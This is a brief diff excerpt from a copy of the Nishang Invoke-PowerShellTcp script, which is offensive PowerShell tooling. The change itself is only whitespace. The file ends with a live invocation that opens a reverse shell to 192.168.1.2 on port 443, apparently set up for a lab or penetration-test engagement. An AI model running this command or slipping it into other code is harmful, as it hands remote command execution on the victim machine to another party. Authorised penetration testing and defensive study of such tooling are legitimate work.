@@ -122,5 +122,6 @@ https://github.com/samratashok/nishang
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
         Write-Error $_
     }
-}
+} 
+
 Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.2 -Port 443
